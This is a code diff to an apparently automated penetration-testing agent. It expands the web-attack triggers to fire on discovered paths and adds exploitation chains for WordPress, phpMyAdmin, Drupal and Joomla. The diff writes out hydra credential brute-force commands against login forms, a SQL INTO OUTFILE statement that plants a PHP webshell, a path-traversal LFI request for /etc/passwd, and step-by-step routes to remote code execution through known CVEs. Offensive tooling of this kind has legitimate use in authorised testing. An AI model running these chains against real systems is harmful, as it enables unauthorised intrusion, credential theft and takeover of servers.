@@ -101,9 +101,59 @@ def _intel_has(ctx, key: str) -> bool:
     return bool(ctx.intel.get(key))
 
 
+def _web_evidence(ctx) -> str:
+    """Concatenate ALL web-surface signals into one searchable haystack:
+    service banners, fingerprinted technologies, discovered web paths and
+    login pages.  This lets app-aware triggers fire on what enumeration
+    ACTUALLY found (e.g. ``/wp-login.php`` in web_paths, ``/phpmyadmin`` in
+    login_pages) — not just the nmap service banner.  The failed
+    10.48.x engagement detected WordPress + phpMyAdmin via discovered paths
+    yet never attacked them because the triggers only checked banners.
+    """
+    parts: List[str] = []
+    svcs = ctx.services or {}
+    for _p, svc in svcs.items():
+        if isinstance(svc, dict):
+            parts.extend(str(svc.get(k, "")) for k in
+                         ("service", "product", "version", "banner",
+                          "extrainfo", "info", "title", "app"))
+    intel = ctx.intel or {}
+    for key in ("web_paths", "login_pages", "technologies", "web_targets",
+                "subdomains", "tags", "web_tech", "cms"):
+        v = intel.get(key)
+        if isinstance(v, (list, tuple)):
+            for item in v:
+                parts.append(item.get("name") if isinstance(item, dict) else str(item))
+        elif v:
+            parts.append(str(v))
+    return " ".join(p for p in parts if p).lower()
+
+
+def _web_matches(ctx, pattern: str) -> bool:
+    """True if the web-surface haystack matches ``pattern`` (case-insensitive)."""
+    try:
+        return bool(re.search(pattern, _web_evidence(ctx)))
+    except Exception:
+        return False
+
+
 def _target_host(ctx) -> str:
-    """Extract a hostname / IP we can interpolate into commands."""
-    return (ctx.intel.get("target_host") or
+    """Extract the hostname / IP to interpolate into web commands.
+
+    Routes through the central target resolver so trigger-fired web tools
+    (wpscan, droopescan, curl chains, …) hit the discovered VHOST (e.g.
+    cctv.htb) instead of the bare IP that only 302-redirects.  Falls back to
+    the legacy intel keys / raw target when no vhost is known.
+    """
+    try:
+        from agents.recon import target_resolver as _tr
+        wh = _tr.web_host(ctx.intel)
+        if wh:
+            return wh
+    except Exception:
+        pass
+    return (ctx.intel.get("web_host") or
+            ctx.intel.get("target_host") or
             ctx.intel.get("target_url") or
             ctx.target or "TARGET")
 
@@ -136,21 +186,99 @@ def _build_default_triggers() -> List[Trigger]:
         ],
     ))
 
-    # ── WordPress ──
+    # ── WordPress — full attack chain (fires off discovered paths too) ──
     triggers.append(Trigger(
-        name="wordpress_full_enum",
-        when=lambda ctx: _service_matches(ctx, banner_re=r"wordpress|wp-content|wp-login"),
+        name="wordpress_attack_chain",
+        when=lambda ctx: _web_matches(ctx, r"wordpress|wp-login|wp-admin|wp-content|wp-json"),
+        actions=[
+            T(kind="command", priority=9,
+              payload="wpscan --url http://{host}/ --enumerate u,ap,at,cb,dbe "
+                       "--plugins-detection aggressive --random-user-agent "
+                       "--disable-tls-checks -f cli-no-color",
+              rationale="WordPress — enumerate users + ALL plugins/themes (aggressive) + "
+                          "config backups/db exports → known-vuln chains"),
+            T(kind="command", priority=8,
+              payload="curl -sk http://{host}/xmlrpc.php -d "
+                       "'<methodCall><methodName>system.listMethods</methodName></methodCall>'",
+              rationale="WordPress xmlrpc — system.multicall enables amplified credential "
+                          "brute + pingback SSRF"),
+            T(kind="command", priority=7,
+              payload="curl -sk http://{host}/wp-json/wp/v2/users",
+              rationale="WordPress REST API user enumeration (author slugs → usernames)"),
+            T(kind="insight", priority=9,
+              payload="WordPress RCE path: (1) wpscan enumerates users+outdated plugins/themes; "
+                       "(2) searchsploit/wpscan any outdated plugin for arbitrary-upload/RCE; "
+                       "(3) brute discovered users via xmlrpc system.multicall or wp-login; "
+                       "(4) admin login → upload malicious plugin/theme zip OR edit a theme PHP "
+                       "file (Appearance→Editor) → webshell → curl ?cmd=id."),
+        ],
+    ))
+
+    # ── phpMyAdmin — version CVEs + cred brute + INTO OUTFILE webshell ──
+    triggers.append(Trigger(
+        name="phpmyadmin_attack_chain",
+        when=lambda ctx: _web_matches(ctx, r"phpmyadmin|pmahomme|/pma/"),
         actions=[
             T(kind="command", priority=8,
-              payload="wpscan --url http://{host} --enumerate u,p,t --random-user-agent",
-              rationale="WordPress detected — enumerate users, plugins, themes for known-vuln chains"),
+              payload="curl -sk http://{host}/phpmyadmin/doc/html/index.html "
+                       "| grep -oiE 'version [0-9.]+' | head -1; "
+                       "curl -sk http://{host}/phpmyadmin/README | head -3",
+              rationale="phpMyAdmin — pin exact version → CVE (4.8.0/4.8.1 LFI→RCE "
+                          "CVE-2018-12613; 4.8.x SQL/preauth chains)"),
+            T(kind="command", priority=8,
+              payload="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                       "-P /usr/share/wordlists/rockyou.txt -f {host} "
+                       "http-post-form '/phpmyadmin/index.php:pma_username=^USER^&"
+                       "pma_password=^PASS^&server=1:Cannot log in' -t 4",
+              rationale="phpMyAdmin login brute — weak DB creds (root:'' , root:root)"),
+            T(kind="insight", priority=10,
+              payload="phpMyAdmin → RCE: log in (try root:'' / root:root first), then run SQL "
+                       "SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE "
+                       "'/var/www/html/s.php' (needs FILE priv + empty secure_file_priv + "
+                       "writable webroot), then curl http://{host}/s.php?0=id . Also test "
+                       "CVE-2018-12613 LFI: /phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd"),
+        ],
+    ))
+
+    # ── Drupal — Drupalgeddon ──
+    triggers.append(Trigger(
+        name="drupal_attack_chain",
+        when=lambda ctx: _web_matches(ctx, r"drupal|/sites/(default|all)/|/core/misc/drupal\.js|x-generator.{0,8}drupal"),
+        actions=[
+            T(kind="command", priority=9,
+              payload="droopescan scan drupal -u http://{host}/ 2>/dev/null "
+                       "|| curl -sk http://{host}/CHANGELOG.txt | head -1",
+              rationale="Drupal — fingerprint version → Drupalgeddon2/3 unauth RCE"),
+            T(kind="insight", priority=10,
+              payload="Drupal: 7.x/8.x → Drupalgeddon2 (CVE-2018-7600) unauth RCE via the "
+                       "registration form #post_render — metasploit "
+                       "exploit/unix/webapp/drupal_drupalgeddon2 or public curl PoC "
+                       "(POST /user/register?element_parents=...&_format=json). Drupalgeddon3 "
+                       "(CVE-2018-7602) needs a session cookie."),
+        ],
+    ))
+
+    # ── Joomla ──
+    triggers.append(Trigger(
+        name="joomla_attack_chain",
+        when=lambda ctx: _web_matches(ctx, r"joomla|/administrator/|com_content|/media/jui/"),
+        actions=[
+            T(kind="command", priority=8,
+              payload="joomscan --url http://{host}/ 2>/dev/null "
+                       "|| curl -sk http://{host}/administrator/manifests/files/joomla.xml "
+                       "| grep -oiE '<version>[^<]+'",
+              rationale="Joomla — fingerprint version + vulnerable components"),
+            T(kind="insight", priority=9,
+              payload="Joomla <3.4.6 → CVE-2015-8562 unauth object-injection RCE "
+                       "(payload in User-Agent/X-Forwarded-For, stored in session). Enumerate "
+                       "components with joomscan then searchsploit component+version."),
         ],
     ))
 
     # ── Tomcat /manager ──
     triggers.append(Trigger(
         name="tomcat_manager_default_creds",
-        when=lambda ctx: _service_matches(ctx, banner_re=r"tomcat|coyote"),
+        when=lambda ctx: _web_matches(ctx, r"tomcat|coyote|/manager/html|/host-manager"),
         actions=[
             T(kind="command", priority=8,
               payload="hydra -L /usr/share/seclists/Usernames/Common-Credentials/best110.txt "
@@ -166,7 +294,7 @@ def _build_default_triggers() -> List[Trigger]:
     # ── Jenkins ──
     triggers.append(Trigger(
         name="jenkins_script_console",
-        when=lambda ctx: _service_matches(ctx, banner_re=r"jenkins"),
+        when=lambda ctx: _web_matches(ctx, r"jenkins|/script|hudson"),
         actions=[
             T(kind="command", priority=9,
               payload="curl -sk http://{host}/script -I",
@@ -180,7 +308,7 @@ def _build_default_triggers() -> List[Trigger]:
     # ── Confluence ──
     triggers.append(Trigger(
         name="confluence_cve_chain",
-        when=lambda ctx: _service_matches(ctx, banner_re=r"confluence|atlassian"),
+        when=lambda ctx: _web_matches(ctx, r"confluence|atlassian"),
         actions=[
             T(kind="insight", priority=10, payload="Confluence detected — check CVE-2023-22515 (broken access control, admin creation) and CVE-2022-26134 (OGNL RCE)"),
             T(kind="command", priority=9,
@@ -193,7 +321,7 @@ def _build_default_triggers() -> List[Trigger]:
     # ── GitLab ──
     triggers.append(Trigger(
         name="gitlab_recon",
-        when=lambda ctx: _service_matches(ctx, banner_re=r"gitlab"),
+        when=lambda ctx: _web_matches(ctx, r"gitlab"),
         actions=[
             T(kind="command", priority=8,
               payload="curl -sk http://{host}/explore/projects",
